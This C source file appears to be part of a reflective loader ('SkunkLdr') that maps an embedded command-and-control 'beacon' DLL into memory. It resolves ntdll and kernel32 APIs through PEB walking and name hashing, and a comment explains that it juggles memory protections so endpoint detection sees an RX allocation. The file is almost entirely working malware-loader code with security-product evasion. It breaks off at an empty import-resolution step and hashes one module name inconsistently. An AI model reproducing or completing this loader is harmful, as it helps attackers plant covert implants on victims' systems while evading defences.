#include "Skunk.h"
#include "Ldr.h"

EXTERN_C
FUNC
VOID
WINAPI
SkunkLdr(VOID) {
    INSTANCE                instance        = {0};
    PVOID                   pSkunkBase      = NULL;
    HMODULE                 pBeacon         = NULL;
    PIMAGE_NT_HEADERS       pImgNtHeaders   = NULL;
    PIMAGE_SECTION_HEADER   pImgSecHeader   = NULL;
    PIMAGE_DATA_DIRECTORY   pimgDataDir     = NULL;
    LPVOID                  pMemAddr        = NULL;
    SIZE_T                  sMemSize        = 0;
    PVOID                   pMemSec         = NULL;
    PVOID                   pMemSecSize     = NULL;
    DWORD                   dwMemPrt        = 0;
    ULONG                   ullOldPrt       = 0;

    // Some of the code below might show an error in your IDE. Ignore it, I promise it works

    // Compute base of loader and beacon lib
    pSkunkBase = RipStart();
    pBeacon = RipEnd();

    // Resolve needed functions and modules
    if (!(instance.Modules.Ntdll = LdrModulePeb(HASHW(L"ntdll.dll")))) {
        return;
    }
    if (!(instance.Win32.LdrLoadDll = LdrFunction(instance.Modules.Ntdll, HASHA("LdrLoadDll")))) {
        return;
    }
    if (!(instance.Win32.LdrGetProcedureAddress = LdrFunction(instance.Modules.Ntdll, HASHA("LdrGetProcedureAddress")))) {
        return;
    }
    if (!(instance.Win32.NtFreeVirtualMemory = LdrFunction(instance.Modules.Ntdll, HASHA("NtFreeVirtualMemory")))) {
        return;
    }
    if (!(instance.Win32.NtAllocateVirtualMemory = LdrFunction(instance.Modules.Ntdll, HASHA("NtAllocateVirtualMemory")))) {
        return;
    }
    if (!(instance.Win32.NtProtectVirtualMemory = LdrFunction(instance.Modules.Ntdll, HASHA("NtProtectVirtualMemory")))) {
        return;
    }
    if (!(instance.Win32.RtlAllocateHeap = LdrFunction(instance.Modules.Ntdll, HASHA("RtlAllocateHeap")))) {
        return;
    }
    if (!(instance.Win32.RtlFreeHeap = LdrFunction(instance.Modules.Ntdll, HASHA("RtlFreeHeap")))) {
        return;
    }
    if (!(instance.Win32.TpAllocWork = LdrFunction(instance.Modules.Ntdll, HASHA("TpAllocWork")))) {
        return;
    }
    if (!(instance.Win32.TpPostWork = LdrFunction(instance.Modules.Ntdll, HASHA("TpPostWork")))) {
        return;
    }
    if (!(instance.Win32.TpReleaseWork = LdrFunction(instance.Modules.Ntdll, HASHA("TpReleaseWork")))) {
        return;
    }

    if (!(instance.Modules.Kernel32 = LdrModulePeb(HASHW("kernel32.dll")))) {
        return;
    }
    if (!(instance.Win32.LoadLibraryA = LdrFunction(instance.Modules.Kernel32, HASHA("LoadLibraryA")))) {
        return;
    }

    // Allocate memory for beacon lib
    pImgNtHeaders = C_PTR(pBeacon + ((PIMAGE_DOS_HEADER) pBeacon)->e_lfanew);
    sMemSize = pImgNtHeaders->OptionalHeader.SizeOfImage;

    // EDR can see original memory protection. Start with RX allocation, switch to RW, then revert to RX
    if (NT_SUCCESS(instance.Win32.NtAllocateVirtualMemory(NtCurrentProcess(), &pMemAddr, 0, &sMemSize, MEM_COMMIT, PAGE_EXECUTE_READ))) {
        // Switch to RW
        instance.Win32.NtProtectVirtualMemory(NtCurrentProcess(), &pMemAddr, &sMemSize, PAGE_READWRITE, &ullOldPrt);

        // Copy beacon lib sections headers into allocated memory
        pImgSecHeader = IMAGE_FIRST_SECTION(pImgNtHeaders);
        for (DWORD i = 0; i < pImgNtHeaders->FileHeader.NumberOfSections; ++i) {
            MemCopy(
                    C_PTR(pMemAddr + pImgSecHeader[i].VirtualAddress),
                    C_PTR(pBeacon + pImgSecHeader[i].PointerToRawData),
                    pImgSecHeader[i].SizeOfRawData
                    );
        }

        // Resolve beacon lib IAT

    }
}